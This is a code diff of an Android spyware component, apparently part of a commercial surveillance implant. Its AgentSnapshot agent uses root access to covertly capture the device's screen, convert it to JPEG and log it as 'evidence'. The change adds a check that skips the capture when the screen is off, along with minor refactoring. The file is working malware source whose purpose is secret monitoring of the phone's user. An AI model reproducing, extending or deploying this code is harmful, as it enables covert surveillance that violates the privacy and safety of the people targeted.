@@ -22,6 +22,7 @@ import android.content.Context;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.Matrix;
+import android.os.PowerManager;
 import android.util.Log;
 import android.view.Display;
 import android.view.Surface;
@@ -29,10 +30,13 @@ import android.view.View;
 import android.view.WindowManager;
 
 import com.android.service.LogR;
+import com.android.service.Standby;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.file.AutoFile;
+import com.android.service.interfaces.Observer;
+import com.android.service.listener.ListenerStandby;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.Utils;
@@ -61,6 +65,7 @@ public class AgentSnapshot extends AgentBase {
 
 	/** The type. */
 	private int type;
+
 
 	/**
 	 * Instantiates a new snapshot agent.
@@ -96,6 +101,17 @@ public class AgentSnapshot extends AgentBase {
 	public void begin() {
 		setDelay(this.delay);
 		setPeriod(this.delay);
+		
+	}
+
+	/*
+	 * (non-Javadoc)
+	 * 
+	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
+	 */
+	@Override
+	public void end() {
+
 	}
 
 	/*
@@ -104,9 +120,7 @@ public class AgentSnapshot extends AgentBase {
 	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
 	 */
 	@Override
-	public void go() {
-		// final LogR log = new LogR(EvidenceType.SNAPSHOT, LogR.LOG_PRI_STD);
-
+	public synchronized void go() {
 		switch (type) {
 		case CAPTURE_FULLSCREEN:
 
@@ -128,6 +142,13 @@ public class AgentSnapshot extends AgentBase {
 		try {
 
 			if (Status.self().haveRoot()) {
+				
+				boolean isScreenOn = ListenerStandby.isScreenOn();
+				if(!isScreenOn){
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " (go): Screen powered off, no snapshot");
+					return;
+				}
+								
 				Display display = ((WindowManager) Status.getAppContext()
 						.getSystemService(Context.WINDOW_SERVICE))
 						.getDefaultDisplay();
@@ -158,7 +179,7 @@ public class AgentSnapshot extends AgentBase {
 					buffer = null;
 					raw = null;
 
-					if(orientation != Surface.ROTATION_0){
+					if (orientation != Surface.ROTATION_0) {
 						Matrix matrix = new Matrix();
 						if (orientation == Surface.ROTATION_90)
 							matrix.setRotate(270);
@@ -166,16 +187,16 @@ public class AgentSnapshot extends AgentBase {
 							matrix.setRotate(90);
 						else if (orientation == Surface.ROTATION_180)
 							matrix.setRotate(180);
-						
-						bitmap = Bitmap.createBitmap(bitmap, 0, 0,
-		                          width, height, matrix, true);					
+
+						bitmap = Bitmap.createBitmap(bitmap, 0, 0, width,
+								height, matrix, true);
 					}
 
 					byte[] jpeg = toJpeg(bitmap);
 					bitmap = null;
 
 					new LogR(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
-					jpeg=null;
+					jpeg = null;
 				}
 			}
 		} catch (Exception ex) {
@@ -216,7 +237,7 @@ public class AgentSnapshot extends AgentBase {
 		byte[] array = os.toByteArray();
 		try {
 			os.close();
-			
+
 		} catch (IOException e) {
 			if (Cfg.DEBUG)
 				e.printStackTrace();
@@ -260,13 +281,4 @@ public class AgentSnapshot extends AgentBase {
 		return null;
 	}
 
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
-	 */
-	@Override
-	public void end() {
-
-	}
 }
